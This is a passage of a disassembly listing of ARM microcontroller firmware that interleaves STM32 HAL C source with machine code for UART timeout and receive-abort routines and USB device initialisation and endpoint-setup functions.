 8005d74:	3308      	adds	r3, #8
 8005d76:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d78:	693b      	ldr	r3, [r7, #16]
 8005d7a:	e853 3f00 	ldrex	r3, [r3]
 8005d7e:	60fb      	str	r3, [r7, #12]
   return(result);
 8005d80:	68fb      	ldr	r3, [r7, #12]
 8005d82:	f023 0301 	bic.w	r3, r3, #1
 8005d86:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d88:	687b      	ldr	r3, [r7, #4]
 8005d8a:	681b      	ldr	r3, [r3, #0]
 8005d8c:	3308      	adds	r3, #8
 8005d8e:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005d90:	61fa      	str	r2, [r7, #28]
 8005d92:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d94:	69b9      	ldr	r1, [r7, #24]
 8005d96:	69fa      	ldr	r2, [r7, #28]
 8005d98:	e841 2300 	strex	r3, r2, [r1]
 8005d9c:	617b      	str	r3, [r7, #20]
   return(result);
 8005d9e:	697b      	ldr	r3, [r7, #20]
 8005da0:	2b00      	cmp	r3, #0
 8005da2:	d1e5      	bne.n	8005d70 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005da4:	687b      	ldr	r3, [r7, #4]
 8005da6:	2220      	movs	r2, #32
 8005da8:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005dac:	687b      	ldr	r3, [r7, #4]
 8005dae:	2200      	movs	r2, #0
 8005db0:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005db4:	2303      	movs	r3, #3
 8005db6:	e011      	b.n	8005ddc <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005db8:	687b      	ldr	r3, [r7, #4]
 8005dba:	2220      	movs	r2, #32
 8005dbc:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005dbe:	687b      	ldr	r3, [r7, #4]
 8005dc0:	2220      	movs	r2, #32
 8005dc2:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005dc6:	687b      	ldr	r3, [r7, #4]
 8005dc8:	2200      	movs	r2, #0
 8005dca:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005dcc:	687b      	ldr	r3, [r7, #4]
 8005dce:	2200      	movs	r2, #0
 8005dd0:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005dd2:	687b      	ldr	r3, [r7, #4]
 8005dd4:	2200      	movs	r2, #0
 8005dd6:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005dda:	2300      	movs	r3, #0
}
 8005ddc:	4618      	mov	r0, r3
 8005dde:	3758      	adds	r7, #88	; 0x58
 8005de0:	46bd      	mov	sp, r7
 8005de2:	bd80      	pop	{r7, pc}

08005de4 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005de4:	b580      	push	{r7, lr}
 8005de6:	b084      	sub	sp, #16
 8005de8:	af00      	add	r7, sp, #0
 8005dea:	60f8      	str	r0, [r7, #12]
 8005dec:	60b9      	str	r1, [r7, #8]
 8005dee:	603b      	str	r3, [r7, #0]
 8005df0:	4613      	mov	r3, r2
 8005df2:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005df4:	e049      	b.n	8005e8a <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005df6:	69bb      	ldr	r3, [r7, #24]
 8005df8:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005dfc:	d045      	beq.n	8005e8a <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005dfe:	f7fb fab5 	bl	800136c <HAL_GetTick>
 8005e02:	4602      	mov	r2, r0
 8005e04:	683b      	ldr	r3, [r7, #0]
 8005e06:	1ad3      	subs	r3, r2, r3
 8005e08:	69ba      	ldr	r2, [r7, #24]
 8005e0a:	429a      	cmp	r2, r3
 8005e0c:	d302      	bcc.n	8005e14 <UART_WaitOnFlagUntilTimeout+0x30>
 8005e0e:	69bb      	ldr	r3, [r7, #24]
 8005e10:	2b00      	cmp	r3, #0
 8005e12:	d101      	bne.n	8005e18 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005e14:	2303      	movs	r3, #3
 8005e16:	e048      	b.n	8005eaa <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005e18:	68fb      	ldr	r3, [r7, #12]
 8005e1a:	681b      	ldr	r3, [r3, #0]
 8005e1c:	681b      	ldr	r3, [r3, #0]
 8005e1e:	f003 0304 	and.w	r3, r3, #4
 8005e22:	2b00      	cmp	r3, #0
 8005e24:	d031      	beq.n	8005e8a <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005e26:	68fb      	ldr	r3, [r7, #12]
 8005e28:	681b      	ldr	r3, [r3, #0]
 8005e2a:	69db      	ldr	r3, [r3, #28]
 8005e2c:	f003 0308 	and.w	r3, r3, #8
 8005e30:	2b08      	cmp	r3, #8
 8005e32:	d110      	bne.n	8005e56 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005e34:	68fb      	ldr	r3, [r7, #12]
 8005e36:	681b      	ldr	r3, [r3, #0]
 8005e38:	2208      	movs	r2, #8
 8005e3a:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005e3c:	68f8      	ldr	r0, [r7, #12]
 8005e3e:	f000 f838 	bl	8005eb2 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005e42:	68fb      	ldr	r3, [r7, #12]
 8005e44:	2208      	movs	r2, #8
 8005e46:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005e4a:	68fb      	ldr	r3, [r7, #12]
 8005e4c:	2200      	movs	r2, #0
 8005e4e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005e52:	2301      	movs	r3, #1
 8005e54:	e029      	b.n	8005eaa <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005e56:	68fb      	ldr	r3, [r7, #12]
 8005e58:	681b      	ldr	r3, [r3, #0]
 8005e5a:	69db      	ldr	r3, [r3, #28]
 8005e5c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005e60:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005e64:	d111      	bne.n	8005e8a <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005e66:	68fb      	ldr	r3, [r7, #12]
 8005e68:	681b      	ldr	r3, [r3, #0]
 8005e6a:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005e6e:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005e70:	68f8      	ldr	r0, [r7, #12]
 8005e72:	f000 f81e 	bl	8005eb2 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005e76:	68fb      	ldr	r3, [r7, #12]
 8005e78:	2220      	movs	r2, #32
 8005e7a:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005e7e:	68fb      	ldr	r3, [r7, #12]
 8005e80:	2200      	movs	r2, #0
 8005e82:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005e86:	2303      	movs	r3, #3
 8005e88:	e00f      	b.n	8005eaa <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005e8a:	68fb      	ldr	r3, [r7, #12]
 8005e8c:	681b      	ldr	r3, [r3, #0]
 8005e8e:	69da      	ldr	r2, [r3, #28]
 8005e90:	68bb      	ldr	r3, [r7, #8]
 8005e92:	4013      	ands	r3, r2
 8005e94:	68ba      	ldr	r2, [r7, #8]
 8005e96:	429a      	cmp	r2, r3
 8005e98:	bf0c      	ite	eq
 8005e9a:	2301      	moveq	r3, #1
 8005e9c:	2300      	movne	r3, #0
 8005e9e:	b2db      	uxtb	r3, r3
 8005ea0:	461a      	mov	r2, r3
 8005ea2:	79fb      	ldrb	r3, [r7, #7]
 8005ea4:	429a      	cmp	r2, r3
 8005ea6:	d0a6      	beq.n	8005df6 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005ea8:	2300      	movs	r3, #0
}
 8005eaa:	4618      	mov	r0, r3
 8005eac:	3710      	adds	r7, #16
 8005eae:	46bd      	mov	sp, r7
 8005eb0:	bd80      	pop	{r7, pc}

08005eb2 <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005eb2:	b480      	push	{r7}
 8005eb4:	b095      	sub	sp, #84	; 0x54
 8005eb6:	af00      	add	r7, sp, #0
 8005eb8:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005eba:	687b      	ldr	r3, [r7, #4]
 8005ebc:	681b      	ldr	r3, [r3, #0]
 8005ebe:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ec0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005ec2:	e853 3f00 	ldrex	r3, [r3]
 8005ec6:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005ec8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005eca:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005ece:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005ed0:	687b      	ldr	r3, [r7, #4]
 8005ed2:	681b      	ldr	r3, [r3, #0]
 8005ed4:	461a      	mov	r2, r3
 8005ed6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005ed8:	643b      	str	r3, [r7, #64]	; 0x40
 8005eda:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005edc:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005ede:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005ee0:	e841 2300 	strex	r3, r2, [r1]
 8005ee4:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005ee6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005ee8:	2b00      	cmp	r3, #0
 8005eea:	d1e6      	bne.n	8005eba <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005eec:	687b      	ldr	r3, [r7, #4]
 8005eee:	681b      	ldr	r3, [r3, #0]
 8005ef0:	3308      	adds	r3, #8
 8005ef2:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ef4:	6a3b      	ldr	r3, [r7, #32]
 8005ef6:	e853 3f00 	ldrex	r3, [r3]
 8005efa:	61fb      	str	r3, [r7, #28]
   return(result);
 8005efc:	69fb      	ldr	r3, [r7, #28]
 8005efe:	f023 0301 	bic.w	r3, r3, #1
 8005f02:	64bb      	str	r3, [r7, #72]	; 0x48
 8005f04:	687b      	ldr	r3, [r7, #4]
 8005f06:	681b      	ldr	r3, [r3, #0]
 8005f08:	3308      	adds	r3, #8
 8005f0a:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005f0c:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005f0e:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f10:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005f12:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005f14:	e841 2300 	strex	r3, r2, [r1]
 8005f18:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005f1a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005f1c:	2b00      	cmp	r3, #0
 8005f1e:	d1e5      	bne.n	8005eec <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005f20:	687b      	ldr	r3, [r7, #4]
 8005f22:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005f24:	2b01      	cmp	r3, #1
 8005f26:	d118      	bne.n	8005f5a <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005f28:	687b      	ldr	r3, [r7, #4]
 8005f2a:	681b      	ldr	r3, [r3, #0]
 8005f2c:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f2e:	68fb      	ldr	r3, [r7, #12]
 8005f30:	e853 3f00 	ldrex	r3, [r3]
 8005f34:	60bb      	str	r3, [r7, #8]
   return(result);
 8005f36:	68bb      	ldr	r3, [r7, #8]
 8005f38:	f023 0310 	bic.w	r3, r3, #16
 8005f3c:	647b      	str	r3, [r7, #68]	; 0x44
 8005f3e:	687b      	ldr	r3, [r7, #4]
 8005f40:	681b      	ldr	r3, [r3, #0]
 8005f42:	461a      	mov	r2, r3
 8005f44:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005f46:	61bb      	str	r3, [r7, #24]
 8005f48:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f4a:	6979      	ldr	r1, [r7, #20]
 8005f4c:	69ba      	ldr	r2, [r7, #24]
 8005f4e:	e841 2300 	strex	r3, r2, [r1]
 8005f52:	613b      	str	r3, [r7, #16]
   return(result);
 8005f54:	693b      	ldr	r3, [r7, #16]
 8005f56:	2b00      	cmp	r3, #0
 8005f58:	d1e6      	bne.n	8005f28 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005f5a:	687b      	ldr	r3, [r7, #4]
 8005f5c:	2220      	movs	r2, #32
 8005f5e:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005f62:	687b      	ldr	r3, [r7, #4]
 8005f64:	2200      	movs	r2, #0
 8005f66:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005f68:	687b      	ldr	r3, [r7, #4]
 8005f6a:	2200      	movs	r2, #0
 8005f6c:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005f6e:	bf00      	nop
 8005f70:	3754      	adds	r7, #84	; 0x54
 8005f72:	46bd      	mov	sp, r7
 8005f74:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f78:	4770      	bx	lr

08005f7a <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005f7a:	b084      	sub	sp, #16
 8005f7c:	b480      	push	{r7}
 8005f7e:	b083      	sub	sp, #12
 8005f80:	af00      	add	r7, sp, #0
 8005f82:	6078      	str	r0, [r7, #4]
 8005f84:	f107 0014 	add.w	r0, r7, #20
 8005f88:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005f8c:	2300      	movs	r3, #0
}
 8005f8e:	4618      	mov	r0, r3
 8005f90:	370c      	adds	r7, #12
 8005f92:	46bd      	mov	sp, r7
 8005f94:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f98:	b004      	add	sp, #16
 8005f9a:	4770      	bx	lr

08005f9c <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005f9c:	b480      	push	{r7}
 8005f9e:	b085      	sub	sp, #20
 8005fa0:	af00      	add	r7, sp, #0
 8005fa2:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005fa4:	687b      	ldr	r3, [r7, #4]
 8005fa6:	2200      	movs	r2, #0
 8005fa8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005fac:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005fb0:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005fb2:	68fb      	ldr	r3, [r7, #12]
 8005fb4:	b29a      	uxth	r2, r3
 8005fb6:	687b      	ldr	r3, [r7, #4]
 8005fb8:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005fbc:	2300      	movs	r3, #0
}
 8005fbe:	4618      	mov	r0, r3
 8005fc0:	3714      	adds	r7, #20
 8005fc2:	46bd      	mov	sp, r7
 8005fc4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005fc8:	4770      	bx	lr

08005fca <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005fca:	b480      	push	{r7}
 8005fcc:	b085      	sub	sp, #20
 8005fce:	af00      	add	r7, sp, #0
 8005fd0:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005fd2:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005fd6:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005fd8:	687b      	ldr	r3, [r7, #4]
 8005fda:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005fde:	b29a      	uxth	r2, r3
 8005fe0:	68fb      	ldr	r3, [r7, #12]
 8005fe2:	b29b      	uxth	r3, r3
 8005fe4:	43db      	mvns	r3, r3
 8005fe6:	b29b      	uxth	r3, r3
 8005fe8:	4013      	ands	r3, r2
 8005fea:	b29a      	uxth	r2, r3
 8005fec:	687b      	ldr	r3, [r7, #4]
 8005fee:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005ff2:	2300      	movs	r3, #0
}
 8005ff4:	4618      	mov	r0, r3
 8005ff6:	3714      	adds	r7, #20
 8005ff8:	46bd      	mov	sp, r7
 8005ffa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ffe:	4770      	bx	lr

08006000 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8006000:	b480      	push	{r7}
 8006002:	b083      	sub	sp, #12
 8006004:	af00      	add	r7, sp, #0
 8006006:	6078      	str	r0, [r7, #4]
 8006008:	460b      	mov	r3, r1
 800600a:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 800600c:	2300      	movs	r3, #0
}
 800600e:	4618      	mov	r0, r3
 8006010:	370c      	adds	r7, #12
 8006012:	46bd      	mov	sp, r7
 8006014:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006018:	4770      	bx	lr

0800601a <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 800601a:	b084      	sub	sp, #16
 800601c:	b480      	push	{r7}
 800601e:	b083      	sub	sp, #12
 8006020:	af00      	add	r7, sp, #0
 8006022:	6078      	str	r0, [r7, #4]
 8006024:	f107 0014 	add.w	r0, r7, #20
 8006028:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 800602c:	687b      	ldr	r3, [r7, #4]
 800602e:	2201      	movs	r2, #1
 8006030:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8006034:	687b      	ldr	r3, [r7, #4]
 8006036:	2200      	movs	r2, #0
 8006038:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 800603c:	687b      	ldr	r3, [r7, #4]
 800603e:	2200      	movs	r2, #0
 8006040:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8006044:	687b      	ldr	r3, [r7, #4]
 8006046:	2200      	movs	r2, #0
 8006048:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 800604c:	2300      	movs	r3, #0
}
 800604e:	4618      	mov	r0, r3
 8006050:	370c      	adds	r7, #12
 8006052:	46bd      	mov	sp, r7
 8006054:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006058:	b004      	add	sp, #16
 800605a:	4770      	bx	lr

0800605c <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 800605c:	b480      	push	{r7}
 800605e:	b083      	sub	sp, #12
 8006060:	af00      	add	r7, sp, #0
 8006062:	6078      	str	r0, [r7, #4]
 8006064:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006066:	2300      	movs	r3, #0
}
 8006068:	4618      	mov	r0, r3
 800606a:	370c      	adds	r7, #12
 800606c:	46bd      	mov	sp, r7
 800606e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006072:	4770      	bx	lr

08006074 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8006074:	b480      	push	{r7}
 8006076:	b083      	sub	sp, #12
 8006078:	af00      	add	r7, sp, #0
 800607a:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 800607c:	2300      	movs	r3, #0
}
 800607e:	4618      	mov	r0, r3
 8006080:	370c      	adds	r7, #12
 8006082:	46bd      	mov	sp, r7
 8006084:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006088:	4770      	bx	lr
	...

0800608c <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800608c:	b480      	push	{r7}
 800608e:	b09d      	sub	sp, #116	; 0x74
 8006090:	af00      	add	r7, sp, #0
 8006092:	6078      	str	r0, [r7, #4]
 8006094:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8006096:	2300      	movs	r3, #0
 8006098:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 800609c:	687a      	ldr	r2, [r7, #4]
 800609e:	683b      	ldr	r3, [r7, #0]
 80060a0:	781b      	ldrb	r3, [r3, #0]
 80060a2:	009b      	lsls	r3, r3, #2
 80060a4:	4413      	add	r3, r2
 80060a6:	881b      	ldrh	r3, [r3, #0]
 80060a8:	b29b      	uxth	r3, r3
 80060aa:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 80060ae:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80060b2:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 80060b6:	683b      	ldr	r3, [r7, #0]
 80060b8:	78db      	ldrb	r3, [r3, #3]
 80060ba:	2b03      	cmp	r3, #3
 80060bc:	d81f      	bhi.n	80060fe <USB_ActivateEndpoint+0x72>
 80060be:	a201      	add	r2, pc, #4	; (adr r2, 80060c4 <USB_ActivateEndpoint+0x38>)
 80060c0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80060c4:	080060d5 	.word	0x080060d5
 80060c8:	080060f1 	.word	0x080060f1
 80060cc:	08006107 	.word	0x08006107
 80060d0:	080060e3 	.word	0x080060e3
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 80060d4:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80060d8:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80060dc:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80060e0:	e012      	b.n	8006108 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 80060e2:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80060e6:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 80060ea:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80060ee:	e00b      	b.n	8006108 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 80060f0:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80060f4:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80060f8:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80060fc:	e004      	b.n	8006108 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 80060fe:	2301      	movs	r3, #1
 8006100:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8006104:	e000      	b.n	8006108 <USB_ActivateEndpoint+0x7c>
      break;
 8006106:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8006108:	687a      	ldr	r2, [r7, #4]
 800610a:	683b      	ldr	r3, [r7, #0]
 800610c:	781b      	ldrb	r3, [r3, #0]
 800610e:	009b      	lsls	r3, r3, #2
 8006110:	441a      	add	r2, r3
